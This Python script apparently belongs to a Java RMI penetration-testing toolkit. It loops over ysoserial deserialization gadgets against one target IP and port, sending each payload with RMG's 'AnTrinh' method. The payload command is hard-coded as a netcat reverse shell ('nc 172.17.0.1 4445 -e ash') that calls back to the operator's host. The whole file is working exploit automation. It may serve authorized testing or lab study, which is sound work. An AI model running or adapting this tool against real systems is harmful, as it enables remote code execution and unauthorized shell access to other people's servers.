'''
Purpose: 
single target
multiple gadgets

Use this to find how many deserializable gadgets a specific target is vulnerable to
'''

import _common
import ZHOR_Modules.fileManager as fm
import ZHOR_Modules.nicePrints as np
import ZHOR_Modules.userInputUtils as uiu
import ZHOR_Modules.listUtils as lu
import time
import os
import argparse
import sys

parser = argparse.ArgumentParser(description="rmi automation - AnTrinh single target")
REQUIRED_ARGUMENTS = parser.add_argument_group("Required arguments")
OPTIONAL_ARGUMENTS = parser.add_argument_group("Optional arguments")

# Argomenti necessari
REQUIRED_ARGUMENTS.add_argument('-t',metavar='"TARGET"',type=str,required=True,help='Target IP or fqdn')
REQUIRED_ARGUMENTS.add_argument('-p',metavar='"PORT"',type=str,required=True,help='Target port')

# Argomenti opzionali
OPTIONAL_ARGUMENTS.add_argument('--auto',action="store_true",help="Don't prompt the user to press enter to continue")
OPTIONAL_ARGUMENTS.add_argument('--debug',action="store_true",help="Debug mode")

args = parser.parse_args()

np.DEBUG = ('--debug' in sys.argv)

# ==============================================================================================================

if __name__ == '__main__':
    
    _common.CHOSEN_JAVA_VERSION , _ = uiu.interactiveListSelection(_common.CONFIG['java-executables'],promptMessage="Choose Java version to use:")
    _ , _common.CHOSEN_COMPONENT = uiu.interactiveListSelection(_common.COMPONENTS,promptMessage="Choose component:")

    gadgets = fm.fileToSimpleList(_common.CONFIG["ysoserial-gadgets"])

    command = "nc 172.17.0.1 4445 -e ash"

    for g in gadgets:
        _common.RMGListen.start(g,command)
        time.sleep(1)

        _common.RMGSerial.start_AnTrinh(targetIP=args.t,targetPort=args.p)
        time.sleep(1)

        
        if ('--auto' not in sys.argv):        
            np.infoPrint("Press enter to continue")
            input()
        else:
            time.sleep(2)
            np.infoPrint("Proceeding with next ysoserial gadget...")

        _common.killXTerm()

        while (_common.portInUse(int(_common.CONFIG['our-port']))):
            np.debugPrint("Port already bound, waiting for it to be free")
            time.sleep(0.2)
        
